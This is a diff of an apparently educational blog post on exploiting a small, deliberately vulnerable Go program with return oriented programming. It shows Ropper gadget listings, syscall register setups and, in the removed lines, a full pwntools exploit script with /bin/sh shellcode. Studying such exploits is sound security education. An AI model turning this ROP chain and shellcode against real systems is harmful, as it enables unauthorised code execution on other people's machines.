@@ -29,32 +29,36 @@ Because the stack is always a bit unpredictable (for example, environment variab
 they could be different on each program run), the exact address of the shell code could vary slightly. And if we would
 miss it by even a byte, the code would become corrupted and stop working.
 
-To mitigate this, we could send a lot of NOP instructions (opcode `0x90`) between the address and the shell code, and
+To mitigate this, we could send a lot of `NOP` instructions (opcode `0x90`) between the address and the shell code, and
 then try to jump into the middle of those instructions. This way, we don't have to hit the exact correct byte, instead
 the exploit also works if we jump to an address that is a few bytes before or after. This is because all possible
-target addresses (within some range) would be NOP instructions, and the CPU would just follow along all NOP instructions
-until it reaches the shell code and executes it. This technique is called the nopslide, because the CPU in a way slides
-down a slope of NOPs.
+target addresses (within some range) would be `NOP` instructions, and the CPU would just follow along all `NOP`
+instructions until it reaches the shell code and executes it. This technique is called the nop slide, because the CPU in 
+a way slides down a slope of NOPs.
+
+The payload that we would inject could look like this:
+
+TODO: add a picture here
  
 
 ## DEP and ASLR: mitigations against buffer overflows
 
-Unfortunately, these days it isn't this easy anymore. Operating system developers have done a lot of work to implement
-countermeasures against this simple code on the stack exploit.
+Unfortunately, these days it isn't quite that easy anymore. Operating system developers have done a lot of work to 
+implement countermeasures against this simple code-on-the-stack exploit.
 
-Data execution prevention is a technique which assigns the memory pages used by a program different permissions. There
+Data Execution Prevention is a technique which assigns different permissions to the memory pages used by a program. There
 are pages that can only be read (like literals and constants), pages that can be read and executed (like the program
 instructions itself) and pages that can be written (e.g. the stack or heap). But the pages that can be written to can
-not be executed! Different names for this is R^W (read xor write) or NX (non-executable memory). This technique is in
+not be executed! Different names for this are R^W (read xor write) or NX (Non-eXecutable memory). This technique has been in
 use by all major operating systems for years, and it effectively prevents us from writing our code onto the stack and
 then executing it.
 
-Another mitigation is address space layout randomization (ASLR) which randomizes the addresses of dynamically linked
+Another mitigation is Address Space Layout Randomization (ASLR), which randomizes the addresses of dynamically linked
 libraries, or maybe even functions inside the binary itself, when loading it into the RAM. This way, we can not use GDB
 to analyze the binary locally and determine addresses where we might jump to, because on the exploit target (possibly
 remote) the addresses would be completely different.
 
-Fortunately for this proof of concept, Go does not really use ASLR. The binaries produces by the Go compiler have
+Fortunately for this proof of concept, Go does not really use ASLR. The binaries produced by the Go compiler have
 deterministic addresses, and at least this small program gets statically linked so there are no dynamic libraries that
 could be loaded at different addresses. We can see this by running some analysis on the binary file:
 
@@ -105,7 +109,7 @@ contained in the binary. We executed the `win` function that was compiled into t
 jump to code that was on the stack (an RW-page), but instead we jumped into the `.text` segment of the program where all
 the other machine instructions live, too (an RX-page).
 
-By reusing code that is already in the binary, we can defeat data execution prevention.
+By reusing code that is already in the binary, we can defeat Data Execution Prevention.
 
 A generalization of this technique is called return2libc, where we would now jump to a function contained in the huge
 C standard library libc. We could e.g. use the `system` function that allows us to execute arbitrary commands. However,
@@ -116,7 +120,7 @@ making it very hard to find out the correct addresses of libc functions.
 
 ## Return oriented programming
 
-We need a different approach: return oriented programming (ROP). With ROP, we try to jump into code that is contained
+We need a different approach: Return Oriented Programming (ROP). With ROP, we try to jump into code that is contained
 in the binary just as with return2libc, but we jump to a location that contains preferably only one or at most a few 
 machine instructions and a return instruction.
 
@@ -125,34 +129,18 @@ another `ret`, we will simply fetch the next processor word from the stack and j
 us to chain together small pieces of code by putting the addresses of these code snippets on the stack, one after
 another. The important requirements for this are that the code snippets end with a `ret` instruction, and do not modify
 the stack pointer `$rsp`, because modifying the stack pointer would destroy our chain of code snippets. Using these
-snippets, we can craft a program almost like manually coding in assembler, but with only a limited set of assembler
+snippets, we can craft a program almost like manually coding in assembly, but with only a limited set of assembly
 instructions available (the ones we find in the binary).
 
 With these code snippets, we can do arbitrary stuff, including calling syscalls. Syscalls give us the power to e.g.
 read data into a buffer, or change the execution permissions of memory pages used by the program.
 
 To find suitable code snippets, we can either manually decompile the complete binary (very tedious), or use a helper
-tool like ROPgadget or Ropper. I used Ropper here. It provides some automated search tools, but here they couldn't find
-anything so I had to dig in using my own hands.
+tool like ROPgadget or Ropper. I used Ropper here:
 
-The following command shows many usable ROP gadgets (snippets):
+{% github sashs/Ropper no-readme %}
 
-```shell script
-ropper --file main --search "%"
-0x000000000041996b: adc al, 0; ret; 
-0x000000000042dee5: adc al, 0x1f; mov dword ptr [rsp + 0x28], edx; mov qword ptr [rsp + 0x30], rax; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret; 
-0x000000000042da80: adc al, 0x24; call 0x2d660; mov rbp, qword ptr [rsp + 0x40]; add rsp, 0x48; ret; 
-0x000000000044ba26: adc al, 0x24; call 0x4b190; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret; 
-0x000000000046c199: adc al, 0x24; call 0x6bec0; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret; 
-0x000000000046bffa: adc al, 0x24; call 0x6bec0; mov rbp, qword ptr [rsp + 0x28]; add rsp, 0x30; ret; 
-0x00000000004614fa: adc al, 0x24; call rcx; 
-[...]
-```
-
-
-## POC: Spawning a shell
-
-We analyze the short Go program know from the last part:
+We analyze the short Go program known from the last part:
 
 ```go
 // initialize the reader outside of the main function to simplify POC development, as there are less local variables
@@ -177,12 +165,30 @@ func main() {
 }
 ```
 
-I use the Python pwntools to have some more convenient functions in the exploit script.
+The following command shows quite a lot of ROP gadgets (snippets) that are contained in our binary:
+
+```shell script
+ropper --file main --search "%"
+0x000000000041996b: adc al, 0; ret; 
+0x000000000042dee5: adc al, 0x1f; mov dword ptr [rsp + 0x28], edx; mov qword ptr [rsp + 0x30], rax; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret; 
+0x000000000042da80: adc al, 0x24; call 0x2d660; mov rbp, qword ptr [rsp + 0x40]; add rsp, 0x48; ret; 
+0x000000000044ba26: adc al, 0x24; call 0x4b190; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret; 
+0x000000000046c199: adc al, 0x24; call 0x6bec0; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret; 
+0x000000000046bffa: adc al, 0x24; call 0x6bec0; mov rbp, qword ptr [rsp + 0x28]; add rsp, 0x30; ret; 
+0x00000000004614fa: adc al, 0x24; call rcx; 
+[...]
+```
+
+Ropper even provides some automated search tools, but in this specific case they couldn't automatically find a complete
+exploit chain, so I had to dig in using my own hands.
+
+
+## POC: Spawning a shell
 
 Putting the ROP techniques from above into play, the plan looks like this:
 
  1. Set the executable and writable flags for a memory page belonging to the program
- 2. Write some code into the page that spawns a shell
+ 2. Write some code that spawns a shell into the page
  3. Jump to that code
  
 **Step 1: Get a memory page with RWX permissions**
@@ -199,7 +205,10 @@ range in the interval [addr, addr+len-1]. addr must be aligned to a page boundar
 This means we need to provide the address of the region we want to change, the desired size, and the permission to set.
 These permissions work similar to file system permissions, so the integer value 7 means RWX.
 
-We can use the `vmmap` command in GDB to find a suitable memory page:
+I use the Python Exploit Development Assistance (PEDA) for GDB. Follow the instructions on the 
+[PEDA project page](https://github.com/longld/peda) to install it.
+
+With it, we can use the `vmmap` command in GDB PEDA to find a suitable memory page:
 
 ```gdb
 gdb-peda$ vmmap
@@ -219,49 +228,49 @@ How do syscalls work? The general idea is to execute the `syscall` instruction. 
 number into `$rax`, and set up the arguments to the function. The [Linux x86_64 syscall table](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl)
 shows that the `mprotect` syscall has number 10 (`0xa`).
 
-We set up the parameters according to the x86_64 calling convention: the first parameters get passed in registers $rdi,
-$rsi, $rdx, $rxc, $r8, $r9, the remaining ones through the stack. The return value is passed back in $rax. This means
+We set up the parameters according to the `x86_64` calling convention: the first parameters get passed in registers `$rdi`,
+`$rsi`, `$rdx`, `$rxc`, `$r8`, `$r9`, the remaining ones through the stack. The return value is passed back in `$rax`. This means
 that we will need to set up the following situation when executing the `syscall` instruction:
 
- - $rax: 0xa
- - $rdi: 0x00551000
- - $rsi: 0x100
- - $rdx: 0x7
+ - `$rax`: 0xa
+ - `$rdi`: 0x00551000
+ - `$rsi`: 0x100
+ - `$rdx`: 0x7
  
-For this, we now need to find some suitable gadgets in the huge output of Ropper. First, let's try to set $rax to 10.
+For this, we now need to find some suitable gadgets in the huge output of Ropper. First, let's try to set `$rax` to 10.
 There is probably no `mov rax, 10`, so instead what could be useful is a `mov rax, 0` / `sub rax, rax` / `xor rax, rax`
-to set $rax to zero, and then `add rax, 1` to slowly increase it up to 10.
+to set `$rax` to zero, and then `add rax, 1` to slowly increase it up to 10.
 
 I could find a `mov eax, 0; ret;` gadget at address `0x000000000045b900` and debugging in GDB showed that this is indeed
-enough to set the whole rax to zero ($eax is the lower 32 bit of the 64 bit register $rax). Then, combining it with the
-`add rax, 2; mov dword ptr [rip + 0x14d61f], eax; ret;` gadget applied 5 times we can increment $rax to 10. The gadget
-will also move the value to some address in memory but we can just ignore that.
+enough to set the whole `$rax` to zero (`$eax` is the lower 32 bit of the 64 bit register `$rax`). Then, combining it with the
+`add rax, 2; mov dword ptr [rip + 0x14d61f], eax; ret;` gadget applied 5 times we can increment `$rax` to 10. The gadget
+will also move the `$eax` value to some address in memory but we can just ignore that.
 
-For $rdx and $rsi, we can go the easy way and just pop them from the stack, meaning we just put the pop gadget and the
+For `$rdx` and `$rsi`, we can go the easy way and just pop them from the stack, meaning we just put the pop gadget and the
 value directly behind it. Very convenient. The gadgets look like this: `pop rdx; adc al, 0xf6; ret;`. They also
-increment $rax through the `adc` instruction, but if we set up $rdx and $rsi before setting up $rax this is not a
+increment `$rax` through the `adc` instruction, but if we set up `$rdx` and `$rsi` before setting up `$rax` this is not a
 problem because we initialize it to zero anyways.
 
-For setting $rdx, I also found `pop rdx; xor ah, byte ptr [rsi - 9]; ret;`. We could apply it twice to change back the
-xor operation on $rax, but this gadget reads from an address determined through $rsi which will segfault in this 
+For setting `$rdx`, I also found `pop rdx; xor ah, byte ptr [rsi - 9]; ret;`. We could apply it twice to change back the
+`xor` operation on `$rax`, but this gadget reads from an address determined through `$rsi` which will segfault in this 
 context.
 
-The hardest is finding a gadget to set $rdi. There is `pop rdi; sete byte ptr [rsp + 0x10]; ret;`, but this will set
+The hardest is finding a gadget to set `$rdi`. There is `pop rdi; sete byte ptr [rsp + 0x10]; ret;`, but this will set
 a memory address near the stack pointer with the second instruction and thus mess up the ROP chain. The only other good
-gadget option is `pop rdi; dec dword ptr [rax + 0x21]; ret;`,  but this decrements a memory address determined by $rax.
-In theory, we don't need to care about this address, but in first experiments the address would always be invalid and
+gadget option is `pop rdi; dec dword ptr [rax + 0x21]; ret;`,  but this decrements a memory address determined by `$rax`.
+In theory, we don't need to care about this address, but in my experiments the address would always be invalid and
 thus crash the program too early.
 
-I found a solution using the `pop rax; or dh, dh; ret;` gadget. It allows to set $rax directly and therefore also makes
-the above $rax increment workaround unnecessary. I leave it in anyways. The important part is, we can now set $rax to
-some dummy address before executing the pop rdi gadget, and then the program does not crash. I use the address of the
+I found a solution using the `pop rax; or dh, dh; ret;` gadget. It allows to set `$rax` directly and therefore also makes
+the above `$rax` increment workaround unnecessary. I leave it in anyways. The important part is, we can now set `$rax` to
+some dummy address before executing the `pop rdi` gadget, and then the program does not crash. I use the address of the
 fourth memory page from above, the heap, for this: `0x00567000`.
 
-Finally, we need the syscall instruction itself. Fortunately, this is straightforward as there is a `syscall; ret;` 
+Finally, we need the `syscall` instruction itself. Fortunately, this is straightforward as there is a `syscall; ret;` 
 gadget.
 
 Now we can put together the gadget addresses and values. Before them, we put the same padding to offset to the stored
-return address on the stack.
+return address on the stack. I use the Python pwntools to have some more convenient functions in the exploit script.
 
 ```python
 eax0 = 0x000000000045b900 # mov eax, 0; ret;
@@ -319,10 +328,10 @@ We can use the same technique to spawn the syscall as above. The syscall table s
 the syscall with number 0. The file descriptor for standard input also has the number 0. Thus, we need to create the 
 following register situation:
 
- - $rax: 0x0
- - $rdi: 0x0
- - $rsi: 0x00551000
- - $rdx: 0x100
+ - `$rax`: 0x0
+ - `$rdi`: 0x0
+ - `$rsi`: 0x00551000
+ - `$rdx`: 0x100
  
 Conveniently, we already have the ROP gadgets needed and only need to rearrange:
 
@@ -377,84 +386,9 @@ context here. In a next step, we could try to run a local root exploit to escala
 
 ## Complete POC exploit code
 
-Here is the complete POC code as a reference:
+You can read the full POC exploit code in the Github repository that I created for this post series:
 
-```python
-#!/usr/bin/env python2
-
-from pwn import *
-import sys
-
-GDB_MODE = len(sys.argv) > 1 and sys.argv[1] == '--gdb'
-
-if not GDB_MODE:
-    c = process("./main")
-
-
-# gadgets (use ropper to find them)
-eax0 = 0x000000000045b900 # mov eax, 0; ret;
-inc2rax = 0x0000000000419963 # add rax, 2; mov dword ptr [rip + 0x14d61f], eax; ret;
-poprdx = 0x000000000040830c # pop rdx; adc al, 0xf6; ret;
-poprsi = 0x0000000000415574 # pop rsi; adc al, 0xf6; ret;
-syscall = 0x000000000045d329 # syscall; ret;
-poprax = 0x000000000040deac # pop rax; or dh, dh; ret;
-poprdi = 0x000000000040eb97 # pop rdi; dec dword ptr [rax + 0x21]; ret;
-
-# addresses
-buf = 0x00551000 # use vmmap in GDB to find it
-dummy = 0x00567000 # heap
-
-# syscall nums
-mprotect = 0xa
-read = 0x0
-
-
-# put it together
-
-# padding
-payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"
-
-# mark memory page at buf rwx
-payload += p64(poprax) # sete in poprdi mitigation
-payload += p64(dummy)
-payload += p64(poprdi) # 1ST ARGUMENT
-payload += p64(buf) # ADDRESS
-payload += p64(poprsi) # 2ND ARGUMENT
-payload += p64(0x100) # SIZE
-payload += p64(poprdx) # 3RD ARGUMENT
-payload += p64(0x7) # RWX
-payload += p64(eax0) # SET RAX = 0
-payload += p64(inc2rax) * 5 # SET RAX = 10
-payload += p64(syscall) # SYSCALL
-
-# read into buf
-payload += p64(poprax) # sete in poprdi mitigation
-payload += p64(dummy)
-payload += p64(poprdi) # 1ST ARGUMENT
-payload += p64(0x0) # STDIN
-payload += p64(poprsi) # 2ND ARGUMENT
-payload += p64(buf) # ADDRESS
-payload += p64(poprdx) # 3RD ARGUMENT
-payload += p64(0x100) # SIZE
-payload += p64(eax0) # SET RAX = 0
-payload += p64(syscall) # SYSCALL
-
-# jump into buf
-payload += p64(buf)
-
-# machine instructions to spawn /bin/sh
-shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
-
-
-# send it
-
-if GDB_MODE:
-    print(payload + shellcode)
-else:
-    c.sendline(payload)
-    c.sendline(shellcode)
-    c.interactive()
-```
+{% github jlauinger/go-unsafepointer-poc no-readme %}
 
 
 ## Further reading
@@ -464,3 +398,6 @@ Here are some excellent further resources on ROP exploitation on x86_64 architec
  - https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558
  - https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/
  - https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937
+
+
+Next week we are going to continue with part 4: The dangers of directly creating `reflect.SliceHeader` literals
